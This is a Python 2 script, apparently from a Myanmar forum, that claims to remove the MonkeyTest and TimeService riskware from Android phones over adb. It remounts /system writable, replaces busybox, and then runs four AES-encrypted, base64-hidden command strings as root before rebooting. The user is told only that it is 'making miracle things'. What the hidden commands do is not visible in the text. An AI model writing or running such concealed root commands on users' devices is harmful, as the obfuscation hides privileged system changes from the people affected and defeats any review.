# -*- coding: utf-8 -*-

import base64
import os
import sys
from Crypto.Cipher import AES

BLOCK_SIZE=256

PADDING = '{'

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

d_that_shit = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

key = AES.new('xxxxxxxxxxx-twiz')

def main() :


	dFirst = d_that_shit(key, "P5sW+MNGUuc2p4axzrh2Cvqs2R/F4k3ZL/z8wIyeDcf+Iyzs1dZXthQCo8+bwz2pY9wInNHnDj4x5U56drPRgkaQB3XUELHUz4nFnDEfClgOFDASltFd938asjlvyN+T+JTHfoz72pXLDTyqsIhlQUKjOPF/vm8KIls+sKIkynwVN+KSdhCdMr4PzTVxKFK3ZwjYQmGy8z5h3eGBL32OCX9vNqqS405UOri+AXF7M2YqvtkgS1YDG+acYmPrbiwN+rAKYlD0w3/vhh74pA98PAecHZ/2Nus7wBUcdVacWQiSPa4+/Jnl6FtkyMRlnN9i0+m7Unvg1LVXL5UV1dhoUUwoRxKvX6jAJXyJZg82X2b/zUrg0d0jFYw8HXxUhpmmMosT9O3QSJ57Po9oEUSdGMgvpFx6FfwpErVekn4wdUxcXRjOlHotau8p5xIi4Wi7wVGq+2xcYyjiGWArP+H+JQlItjNBlvUAWvF9d+BKtXD84NZqTJKsTHecZd+ZMcIvRS9bXz9R4B8jQh+CDofNbzneqArybdO/cqJUZvR/iKNIo1L0w1U1tRAei3NAISOq11wUX/GO9ZhPqb9jjg2P7bImRMKvJpLJGvS/TYkolCI2z8BZEKlo7gNZ0TFQyxjrRS9bXz9R4B8jQh+CDofNb0vu5wilqZLxBHExVzoOU4w=")
	dSec = d_that_shit(key, "pvuJLPJUaOrA7JeqL0ZgdfxpNaDnf4OFxdatUNSVMjSAsmZA59F5mwIP0Uerd6XpJqoH0hiSApNhzyuA99pvQVTGiF5hJ+5Y250MCLDZWVj24VbMCvL31Vy+HD/sMQ1o1/vj2k1DlRoPYV14WEyeIiF2th04ujI+z0B9WscLPL7YVUg9xjzw9SHo+JoSICxukC+zk4848jzP9dsxnmHbH40zHDjHLaIxwtTpdrrWJDFtSbc3DcDN6trLlo9ZZPBk1/vj2k1DlRoPYV14WEyeIrKX5lbjJXHzxwz4Z1l5AWFaVG2VKac7TFnydY/FB4VDJqoH0hiSApNhzyuA99pvQWzUqGRnO6K249kBlAC5ezyDQ8Zbn9F+U6NhdcPUJqudPgDyncq4F5t3K4DlALLxaaz9TjUtLD84aYKx1I8UcCBdTyXr50euKAQqgrUY0YTHJqoH0hiSApNhzyuA99pvQdrGkIQrGWH/lfv8N5t/mzVcTsmUlNlBngGZr1qBGMmPPgDyncq4F5t3K4DlALLxaToS4jl0pnppLghtWcT30c9dV/aRE0La5OdBcaGz9igjJqoH0hiSApNhzyuA99pvQSI047ppouD/Gue+oyCB/KfxaGdqg2Sn3gJaS0YaP42fsWRFHjD0rBCp0Ks+m8i6KbZ+o4KXDecJfD88Zuy9FMdkaVWZ3JCHn7RtP0ybR5o15QglGXHeyzRvi8ZEevtz5m9cQsvGDvNZTAuKR0Sa2m+PrssEyqlkU7+X7rBczwf3T2kDo2w+Kuzkgg0abdWnIqf+oJNkrBjq5s3rLVPc8VQNTOA6xrNJtA9KjJvSWvo8zQPx6E4+A+EbFuIbOKrQ6g8fd3X9Rq07KKWQnUFmMBZHmJTa1aAYg8789hKy++jWiIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")
	dThird = d_that_shit(key, "phEfmDrhJnWzuqtOIvJun4AMGBDRpqfSXeyEc5DPeuNgrNPjMKvzONFGqvSNTp3ORoGMPXxnaIYvEy2Ah8tRNp1ijJ3JxTZrchVgSNfo24SIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJw==")
	dFourth = d_that_shit(key, "u3AZEO4OAksQcHLnsj9YD+TfjEyO4AFMnw7RMOOYMWgW2oj+bYjB9OH0sUrtPpDZ5N+MTI7gAUyfDtEw45gxaBbaiP5tiMH04fSxSu0+kNlZbnR5xCDkJXtTsJBSq5WxCc5H/ntDSHlbV+23XKKLpA78kiOAjQRi3DbHvyrEUdDrRDqqPQ+sxGk2YJapLUMBDhQwEpbRXfd/GrI5b8jfk6yhCEBdQXX3/C+kIgDpGkTBIurDXKHKxOrCFkycGbsRL/XpSRURScwKdqpfEM7IgdGR4otBlUN9/xA4J2nUn23cWFfgzWnyPnjL2fVN0qNt55E1NI/wfizYTOn4SnGwuot2ZyFKVwK4NTmbC5luuUXv/gz0o63d7Zb1H/Mt/K0zXwvuROOkYX6kI8uk5j2/wY9opVU74HFWlBeAYlTH5/w97Hbi1PXU2f7/lKGkHn4GIzmDr+vwUSJ4lC3lqqtFtqEh10EUV+gvNYOXJmE8wYH7neJujVLBGmenePE5sKtyEYNOcSemEXmwc6Q3ItVw1B4WGSnY2LnNgCcobDo4eZIeHuIlMuwm+bbn4oaJTOAWA9tLkth0kzQFtPVOLUb1ljLxR+j4vJH0rtTC7Zd6XsqYorflNaM3PoU2M9/t50kwJrXtDfs3BDMTyS3YoGMztay7sjFU4gnab+/qtClezVpZKHaruuU6hixwZLCem2uIYp9pWhml6J+G0nfLMoCiBWep/RSsyD68puDo2lZI16GIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")

	print '###################################'
	print '###################################'
	print '# TwizzyIndy				     ##'
	print '# MonkeyTest&TimeService Remover###'
	print '###################################'
	print '###################################'
	print ''
	print 'this tiny script will remove MonkeyTest and TimeService riskwares.'
	print 'and will make protect them for device. your device will not be able to'
	print 'affected again.'
	print ''
	print 'Myanmar Online Family'
	print 'http://mof.asia/forum.php'
	print ''

	print 'Pushing busybox ...'
	os.system('adb push busybox /data/local/tmp')
	os.system("adb shell su -c 'chmod 644 /data/local/tmp/busybox'")
	os.system("adb shell su -c '/data/local/tmp/busybox mount -o remount,rw /system'")
	os.system("adb shell su -c 'cat /data/local/tmp/busybox >/system/bin/busybox'")
	os.system("adb shell su -c 'chmod 644 /system/bin/busybox'")

	print 'making miracle things (1/3)'
	os.system('adb shell ' + dFirst)

	print 'making miracle things (2/3)'
	os.system('adb shell ' + dSec)

	print 'making miracle things (3/3)'
	os.system('adb shell ' + dThird)

	print 'protecting you from that things ...'
	os.system('adb shell ' + dFourth)

	print 'BINGO !!!'
	print 'ur device will gettin reboot ..'

	os.system('adb reboot')
	print 'bye ...'
	
	sys.exit(0)

if __name__ == "__main__":
	main()

